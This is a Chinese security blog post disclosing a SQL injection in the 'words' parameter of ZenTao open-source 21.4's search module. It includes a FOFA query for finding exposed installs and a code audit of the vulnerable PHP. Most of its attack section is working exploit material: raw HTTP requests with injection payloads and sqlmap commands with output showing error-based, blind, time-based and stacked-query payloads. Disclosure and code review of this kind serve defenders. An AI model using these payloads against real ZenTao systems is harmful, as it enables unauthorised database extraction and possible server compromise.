---
title: "禅道开源版21.4最新版 search 模块的 words sql注入漏洞"
source: https://mrxn.net/jswz/zentao-search-words-sqli.html
---

# 禅道开源版21.4最新版 search 模块的 words sql注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/15 08:16
* 1355浏览
* [0评论](#comment)
* 2小时
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

禅道开源版是一款研发项目管理软件。产道开源版 search 模块的 words 参数存在
[sql注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "sql注入")
漏洞，具有登录权限的攻击者可利用此漏洞获取系统数据库数据，甚至在高权限数据库账户下获取服务器权限。

# fofa语法

> `app="易软天创-禅道系统"`

# 影响版本

<=21.4(禅道开源版最新版)

# 漏洞分析

环境搭建

```
docker pull easysoft/zentao:21.4
mkdir zentao21.4 && cd zentao21.4
docker run -d -v ./data:/data -p 8082:80 -e MYSQL_INTERNAL=true -e REDIS_INTERNAL=true easysoft/zentao:21.4
```

然后访问
<http://localhost:8082/>
即可打开安装界面，在最后一步可勾选导入 demo 数据。

![禅道开源版21.4最新版 search 模块的 words sql注入漏洞](https://image.mrxn.net/1da1009318ac4767b84a0ffdc9c506ba.webp)

登录进后台首页后，在右下角的搜索输入框里随便输入，然后访问搜索结果

![禅道开源版21.4最新版 search 模块的 words sql注入漏洞](https://image.mrxn.net/1649ca5c7ccd41cb99f339242d393707.webp)

正常显示如下

![禅道开源版21.4最新版 search 模块的 words sql注入漏洞](https://image.mrxn.net/b35bfcb3a68948559a09beed57a62b14.webp)

给 words 增加一个 单引号后有SQL报错

`http://localhost:8082/index.php?m=search&f=index&words=123%27&type=all`

![禅道开源版21.4最新版 search 模块的 words sql注入漏洞](https://image.mrxn.net/8af540407bc74237a8d8b734c48a6418.webp)

根据报错点直接看 module/search/control.php 文件搜索 words 找到 index 方法

```
#3 module/search/control.php(359): searchModel->getList('123'', 'all', Object(pager))
```

```
    /**
     * 全局搜索结果页面。
     * Global search results home page.
     *
     * @param  int    $recTotal
     * @param  int    $pageID
     * @access public
     * @return void
     */
    public function index($recTotal = 0, $pageID = 1)
    {
        $this->lang->admin->menu->search = "{$this->lang->search->common}|search|index";

        /* 获取搜索的关键词。*/
        /* Get the words. */
        if(empty($words)) $words = $this->get->words;
        if(empty($words)) $words = $this->post->words;
        if(empty($words) && ($recTotal != 0 || $pageID != 1)) $words = $this->session->searchIngWord;
        $words = strip_tags(strtolower($words));

        /* 获取搜索类型。*/
        /* Get the type. */
        if(empty($type)) $type = $this->get->type;
        if(empty($type)) $type = $this->post->type;
        if(empty($type) && ($recTotal != 0 || $pageID != 1)) $type = $this->session->searchIngType;
        if(is_array($type)) $type = array_filter(array_unique($type));
        $type = (empty($type) || (is_array($type) && in_array('all', $type))) ? 'all' : $type;

        /* 开始搜索时记录当时的时间。*/
        $begin = time();

        $this->app->loadClass('pager', $static = true);
        $pager   = new pager(0, $this->config->search->recPerPage, $pageID);
        $results = $this->search->getList($words, $type, $pager);

        $uri  = inlink('index', "recTotal=$pager->recTotal&pageID=$pager->pageID");
        $uri .= strpos($uri, '?') === false ? '?' : '&';
        $uri .= 'words=' . $words;
        $this->searchZen->setSessionForIndex($uri, $words, $type);

        $this->view->title      = $this->lang->search->index;
        $this->view->results    = $results;
        $this->view->consumed   = time() - $begin;
        $this->view->type       = $type;
        $this->view->typeList   = $this->searchZen->getTypeList();
        $this->view->pager      = $pager;
        $this->view->words      = $words;
        $this->view->referer    = $this->session->referer;

        $this->display();
    }
}
```

words 支持 get post两种方式获取处理后，传递给 getList 方法，在 module/search/model.php 中实现

```
/**
     * 获取搜索结果。
     * get search results of keywords.
     *
     * @param  string $keywords
     * @param  string $type
     * @param  object $pager
     * @access public
     * @return array
     */
    public function getList($keywords, $type, $pager = null)
    {
        list($words, $againstCond, $likeCondition) = $this->searchTao->getSqlParams($keywords);
        $allowedObjects = $this->searchTao->getAllowedObjects($type);

        $filterObjects = array();
        foreach($allowedObjects as $index => $object)
        {
            if(strpos(',feedback,ticket,', ",$object,") === false) continue;

            unset($allowedObjects[$index]);
            $filterObjects[] = $object;
        }

        $scoreColumn = "(MATCH(title, content) AGAINST('{$againstCond}' IN BOOLEAN MODE))";
        $stmt = $this->dao->select("*, {$scoreColumn} as score")->from(TABLE_SEARCHINDEX)
            ->where("(MATCH(title,content) AGAINST('{$againstCond}' IN BOOLEAN MODE) >= 1 {$likeCondition})")
            ->andWhere('((vision')->eq($this->config->vision)
            ->andWhere('objectType')->in($allowedObjects)
            ->markRight(1)
            ->orWhere('(objectType')->in($filterObjects)
            ->markRight(2)
            ->andWhere('addedDate')->le(helper::now())
            ->orderBy('score_desc, editedDate_desc')
            ->query();

        $results     = array();
        $idListGroup = array();
        while($record = $stmt->fetch())
        {
            $results[$record->id] = $record;

            $module = $record->objectType == 'case' ? 'testcase' : $record->objectType;
            $idListGroup[$module][$record->objectID] = $record->objectID;
        }

        $results = $this->searchTao->checkPriv($results, $idListGroup);
        if(empty($results)) return $results;

        /* Reset pager total and get this page data. */
        if($pager) $results = $this->searchTao->setResultsInPage($results, $pager);

        $objectList = $this->searchTao->getobjectList($idListGroup);
        return $this->processResults($results, $objectList, $words);
    }
```

然后调用 module/search/tao.php 中的 getSqlParams 函数来处理 words 后，将$againstCond 和 $likeCondition 直接拼接进SQL语句的 where 条件中执行最终的 SQL 语句查询

```
/**
     * 获取 sql 语句的参数。
     * Get list sql params.
     *
     * @param  string    $keywords
     * @access protected
     * @return array
     */
    protected function getSqlParams($keywords)
    {
        $spliter = $this->app->loadClass('spliter');
        $words   = explode(' ', $this->unify($keywords, ' '));

        $against     = '';
        $againstCond = '';
        foreach($words as $word)
        {
            /* 将 utf-8 字符串拆分为单词，为每个单词计算 unicode. */
            $splitedWords = $spliter->utf8Split($word);
            $trimmedWord  = trim($splitedWords['words']);
            $against     .= '"' . $trimmedWord . '" ';
            $againstCond .= '(+"' . $trimmedWord . '") ';

            if(is_numeric($word) && strpos($word, '.') === false && strlen($word) == 5) $againstCond .= "(-\" $word \") ";
        }

        $likeCondition = trim($keywords) ? "OR title like '%{$keywords}%' OR content like '%{$keywords}%'" : '';

        $words = str_replace('"', '', $against);
        $words = str_pad($words, 5, '_');

        return array($words, $againstCond, $likeCondition);
    }
```

虽然经过一系列处理，但是没有卵用，无任何过滤，最终造成SQL注入
[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")
。

# 漏洞复现

> GET POST 请求均可

```
GET /index.php?m=search&f=index&words=123')+AND+(SELECT+1474+FROM(SELECT+COUNT(*),CONCAT(0x71716a7871,(SELECT+(ELT(1474=1474,1))),0x716b716a71,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)--+ErSi&type=all&zin=1 HTTP/1.1
Cookie: zentaosid=16bcf74b70e51ffee15e918682213004; lang=zh-cn; vision=rnd; device=desktop; theme=default; hideMenu=false; tab=search
Sec-Fetch-Site: same-origin
X-Zin-App: search
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.4103.116 Safari/537.36
Accept: */*
Connection: keep-alive
Referer: http://localhost:8082/index.php?m=index&f=index&open=L2luZGV4LnBocD9tPXNlYXJjaCZmPWluZGV4JndvcmRzPTEyMyUyNyZ0eXBlPWFsbA==
X-Zin-Uid: YLKXtrAEJTnQzHrA1M2ZQ
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
X-Zin-Debug: true
Host: localhost:8082
Pragma: no-cache
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Dnt: 1
X-Zin-Options: {"selector":["#configJS","title>*","body>*"],"type":"list"}
X-Zin-Cache-Time: 0
```

![禅道开源版21.4最新版 search 模块的 words sql注入漏洞](https://image.mrxn.net/56c5838da2d84d7286ffec6bfa3c35c0.webp)

sqlmap 跑出的结果如下

`python3 sqlmap.py -r 1.txt --dbms mysql --batch -p words`

```
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: http://localhost:8082/index.php?m=search&f=index&words=123') RLIKE (SELECT (CASE WHEN (3407=3407) THEN 123 ELSE 0x28 END))-- SEvY&type=all&zin=1

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://localhost:8082/index.php?m=search&f=index&words=123') AND (SELECT 1474 FROM(SELECT COUNT(*),CONCAT(0x71716a7871,(SELECT (ELT(1474=1474,1))),0x716b716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ErSi&type=all&zin=1

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: http://localhost:8082/index.php?m=search&f=index&words=123');SELECT SLEEP(6)#&type=all&zin=1

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://localhost:8082/index.php?m=search&f=index&words=123') AND (SELECT 7951 FROM (SELECT(SLEEP(6)))aMEx)-- sREW&type=all&zin=1
---
```

# 其他

如果系统开启了伪静态可能的 poc 如下

```
POST /zentao/search-index.html HTTP/1.1
Accept: */*
Referer: http://localhost:8082/zentao/index.html?open=L3plbnRhby9zZWFyY2gtaW5kZXguaHRtbD93b3Jkcz0xMjMlMjcmdHlwZT1hbGw=
X-Zin-App: search
Cookie: zentaosid=16bcf74b70e51ffee15e918682213004; lang=zh-cn; vision=rnd; device=desktop; theme=default; hideMenu=false; tab=search
X-Zin-Debug: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6788.76 Safari/537.36
X-Zin-Options: {"selector":["#configJS","title>*","body>*"],"type":"list"}
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

type=all&words=123');SELECT+SLEEP(5)%23&zin=1
```

# 参考

* `https://www.zentao.net/book/zentaopms/docker-1111.html`
* `https://hub.docker.com/r/easysoft/zentao/tags?name=21.4`

* 标签：
* [#
  漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#
  web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#
  SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#
  代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[禅道开源版21.4最新版 search 模块的 words sql注入漏洞](https://mrxn.net/jswz/zentao-search-words-sqli.html)
  
文章链接：
<https://mrxn.net/jswz/zentao-search-words-sqli.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/zentao-search-words-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/zentao-search-words-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});